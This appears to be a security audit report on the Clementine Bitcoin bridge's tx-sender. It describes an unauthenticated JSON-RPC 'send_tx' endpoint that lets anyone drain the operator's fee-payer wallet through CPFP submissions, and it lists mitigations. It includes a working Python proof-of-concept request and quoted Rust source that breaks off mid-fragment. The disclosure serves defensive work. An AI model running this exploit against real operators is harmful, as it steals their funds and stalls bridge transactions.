### Title
Unauthenticated JSON-RPC `send_tx` Endpoint Allows Arbitrary CPFP Fee Drain of TxSender-Managed Bitcoin Wallet — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The standalone `clementine-tx-sender` JSON-RPC server exposes a `send_tx` method with no authentication. Any caller who can reach the endpoint can submit an arbitrary Bitcoin transaction with `fee_paying_type: CPFP`. The TxSender automation will then use its own fee-payer UTXOs — funded from the operator's/verifier's Bitcoin Core wallet — to pay fees for the attacker's transaction, draining the bridge's fee-paying balance and causing liveness failure in the bridge protocol.

---

### Finding Description

The `start_jsonrpc_server` function in `crates/clementine-tx-sender/src/jsonrpc/server.rs` starts a plain HTTP JSON-RPC server with no authentication layer:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
``` [1](#0-0) 

The `send_tx` handler accepts a caller-controlled `InsertTryToSendParams` struct that includes `signed_tx_hex` (arbitrary transaction bytes) and `fee_paying_type` (which can be `CPFP`), and passes them directly to `TxSenderClient::insert_try_to_send` without any origin check: [2](#0-1) 

The configuration explicitly allows binding to `0.0.0.0`, making the server network-accessible: [3](#0-2) 

Once a transaction is queued with `FeePayingType::CPFP`, the TxSender's background loop calls `send_cpfp_tx`, which:

1. Looks for the P2A anchor output (script `51024e73`) in the submitted transaction — any transaction can include this output.
2. Builds a child transaction spending the TxSender's own fee-payer UTXOs alongside the anchor.
3. Signs the child transaction with the TxSender's private key.
4. If fee-payer UTXOs are insufficient, calls `create_fee_payer_utxo`, which invokes `fund_raw_transaction` and `sign_raw_transaction_with_wallet` on the Bitcoin Core wallet to create new funded UTXOs from the operator's wallet balance. [4](#0-3) [5](#0-4) 

The `find_p2a_vout` check only verifies the script bytes match `51024e73` — it does not verify the transaction is a legitimate bridge transaction: [6](#0-5) 

This is the direct analog of the gas-siphoning class: an automation role (`TxSender`) performs fee-paying actions on behalf of submitted transactions, and the transaction content and fee type are fully attacker-controlled.

---

### Impact Explanation

An attacker who can reach the JSON-RPC endpoint (trivially when `TX_SENDER_JSONRPC_BIND=0.0.0.0`, or via any co-located process when bound to `127.0.0.1`) can:

1. Drain the TxSender's fee-payer UTXO pool by repeatedly submitting crafted CPFP transactions.
2. Force the Bitcoin Core wallet to fund new fee-payer UTXOs via `fund_raw_transaction`, draining the operator's/verifier's on-chain BTC balance.
3. Once the fee-payer balance is exhausted, the TxSender cannot pay fees for legitimate bridge transactions: kickoff, assert, challenge-timeout, and reimbursement transactions will stall.
4. A stalled operator who cannot broadcast a `ChallengeTimeout` or `Assert` transaction in time risks losing their collateral to a watchtower challenge, constituting a material loss of operator collateral.

This falls within the allowed impact: **loss of tx-sender-managed balances** and **unauthorized state transition that breaks bridge liveness with material fund impact**.

---

### Likelihood Explanation

- The standalone `clementine-tx-sender` binary is a production component with its own `main.rs` and `run.sh` deployment script.
- The `run.sh` script defaults `TX_SENDER_JSONRPC_BIND` to `127.0.0.1` but explicitly documents `0.0.0.0` as a valid override.
- Even with `127.0.0.1`, any process on the same host (e.g., a compromised co-located service, a CI runner, or a user with shell access) can exploit this.
- The attack requires only a valid Bitcoin transaction with a P2A anchor output — trivially constructable by anyone.
- No privileged key material, no mTLS certificate, and no bridge-protocol knowledge is required.

---

### Recommendation

Add authentication to the JSON-RPC server. Options in increasing strength:

1. **Shared secret / Bearer token**: Require a configurable `Authorization` header on every request. Reject unauthenticated requests before touching the DB.
2. **Allowlist by source IP**: Restrict accepted connections to a configured set of IP addresses.
3. **Mutual TLS**: Mirror the mTLS model used by the gRPC layer — require a client certificate signed by the bridge CA.
4. **Transaction allowlist**: Before queuing, verify that the submitted transaction's inputs spend known bridge UTXOs (i.e., UTXOs tracked in the TxSender DB). Reject transactions that do not reference any known bridge outpoint.

At minimum, the server should reject any `fee_paying_type: CPFP` submission for a transaction whose inputs are not already tracked in the TxSender database as bridge-protocol outputs.

### Proof of Concept

```python
import json, requests, struct

# Craft a minimal Bitcoin transaction with a P2A anchor output (script 51024e73)
# Version(4) + vin_count(1) + vin(41) + vout_count(1) + vout(31) + locktime(4)
# P2A output: value=330 sat (dust limit), script=51024e73
raw_tx_hex = (
    "02000000"          # version 2
    "01"                # 1 input
    "00" * 32 + "ffffffff"  # prev txid (zeros) + vout
    "00"                # script_sig length 0
    "ffffffff"          # sequence
    "01"                # 1 output
    "4a01000000000000"  # 330 sat (little-endian)
    "04" "51024e73"     # P2A anchor script
    "00000000"          # locktime
)

payload = {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "send_tx",
    "params": [{
        "tx_metadata": None,
        "signed_tx_hex": raw_tx_hex,
        "fee_paying_type": "CPFP",   # TxSender will fund fees from its wallet
        "rbf_signing_info": None,
        "cancel_outpoints": [],
        "cancel_txids": [],
        "activate_txids": [],
        "activate_outpoints": [],
    }]
}

# When TX_SENDER_JSONRPC_BIND=0.0.0.0, reachable from any host
r = requests.post("http://<operator-host>:3030", json=payload)
print(r.json())  # Returns try_to_send_id; TxSender will now drain its wallet paying fees
```

The TxSender background loop will pick up the queued transaction, call `create_fee_payer_utxo` (spending from the Bitcoin Core wallet), build and sign a child transaction, and broadcast the CPFP package — all using the operator's own funds. Repeating this loop exhausts the fee-payer balance. [7](#0-6) [8](#0-7) [3](#0-2)

pub async fn start_jsonrpc_server(
    tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    // Citrea-specific RPCs.
    #[cfg(feature = "citrea")]
    {
        module
            .register_async_method("send_citrea_tx", |params, client, _| async move {
                let req: InsertCitreaRawTxParams = params.one().map_err(jsonrpc_err)?;

                let insertion_id = client
                    .send_citrea_tx(req.citrea_tx_request)
                    .await
                    .map_err(jsonrpc_err)?;

                Ok::<i64, ErrorObjectOwned>(insertion_id)
            })
            .map_err(|e| BridgeError::Eyre(e.into()))?;
    }

    let handle = server.start(module);

    Ok(TxSenderJsonRpcServer { handle, local_addr })
}

    async fn create_fee_payer_utxo(
        &self,
        bumped_id: u32,
        dbtx: Option<&mut TxSenderTransaction>,
        tx: &Transaction,
        fee_rate: FeeRateKvb,
        total_fee_payer_amount: Amount,
        fee_payer_utxos_len: usize,
    ) -> Result<()> {
        tracing::debug!(
            "Creating fee payer UTXO for txid {} with bump id {}",
            &tx.compute_txid().to_string(),
            bumped_id
        );
        let required_fee = Self::calculate_required_fee(
            tx.weight(),
            fee_payer_utxos_len + 1,
            fee_rate,
            FeePayingType::CPFP,
        )?;

        // Aggressively add 2x required fee to the total amount to account for sudden spikes
        // We won't actually use 2x fees, but the fee payer utxo will hold that much amount so that while fee payer utxo gets mined
        // if fees increase the utxo should still be sufficient to fund the tx with high probability
        // leftover fees will get sent back to wallet with a change output in fn create_child_tx
        let new_total_fee_needed = required_fee
            .checked_mul(2)
            .and_then(|fee| fee.checked_add(MIN_TAPROOT_AMOUNT));
        if new_total_fee_needed.is_none() {
            return Err(eyre!("Total fee needed is too large, required fee: {}, total fee payer amount: {}, fee rate: {}", required_fee, total_fee_payer_amount, fee_rate).into());
        }
        let new_fee_payer_amount =
            new_total_fee_needed.and_then(|fee| fee.checked_sub(total_fee_payer_amount));

        let new_fee_payer_amount = match new_fee_payer_amount {
            Some(fee) => fee,
            // if underflow, no new fee payer utxo is needed, log it anyway in case its a bug
            None => {
                tracing::debug!("create_fee_payer_utxo was called but no new fee payer utxo is needed for tx: {:?}, required fee: {}, total fee payer amount: {}, current fee rate: {}", tx, required_fee, total_fee_payer_amount, fee_rate);
                return Ok(());
            }
        };

        tracing::debug!(
            "Creating fee payer UTXO with amount {} ({} sat/kvB)",
            new_fee_payer_amount,
            fee_rate
        );

        let fee_payer_tx = Transaction {
            version: Version::TWO,
            lock_time: LockTime::ZERO,
            input: vec![],
            output: vec![TxOut {
                value: new_fee_payer_amount,
                script_pubkey: self.signer.address().script_pubkey(),
            }],
        };

        let fee_payer_bytes = crate::serialize_tx_for_fund_raw(&fee_payer_tx);

        let funded_fee_payer_tx = self
            .rpc
            .fund_raw_transaction(
                &fee_payer_bytes,
                Some(&FundRawTransactionOptions {
                    add_inputs: Some(true),
                    // for cpfp txs, the speed of tx inclusion is not that important, so we can not use unsafe utxos and wait for them to become safe. Also all cpfp fee payer tx's are safe (all wallet owned inputs), so wallet can already chain them
                    include_unsafe: Some(self.include_unsafe),
                    change_address: None,
                    change_position: None,
                    change_type: None,
                    include_watching: None,
                    lock_unspents: None,
                    fee_rate: Some(Amount::from_sat(fee_rate.to_sat_per_kvb())),
                    subtract_fee_from_outputs: None,
                    replaceable: Some(true),
                    conf_target: None,
                    estimate_mode: None,
                }),
                None,
            )
            .await
            .wrap_err("Failed to fund cpfp fee payer tx")?
            .hex;

        let signed_fee_payer_tx: Transaction = bitcoin::consensus::deserialize(
            &self
                .rpc
                .sign_raw_transaction_with_wallet(&funded_fee_payer_tx, None, None)
                .await
                .wrap_err("Failed to sign funded tx through bitcoin RPC")?
                .hex,
        )
        .wrap_err("Failed to deserialize signed tx")?;

        let outpoint_vout = signed_fee_payer_tx
            .output
            .iter()
            .position(|o| {
                o.value == new_fee_payer_amount
                    && o.script_pubkey == self.signer.address().script_pubkey()
            })
            .ok_or(eyre!("Failed to find outpoint vout"))?;

        self.rpc
            .send_raw_transaction(&signed_fee_payer_tx)
            .await
            .wrap_err("Failed to send signed fee payer tx")?;

        self.db
            .save_fee_payer_tx(
                dbtx,
                bumped_id,
                signed_fee_payer_tx.compute_txid(),
                outpoint_vout as u32,
                new_fee_payer_amount,
                None,
            )
            .await
            .map_to_eyre()?;

        Ok(())

                fee_rate,
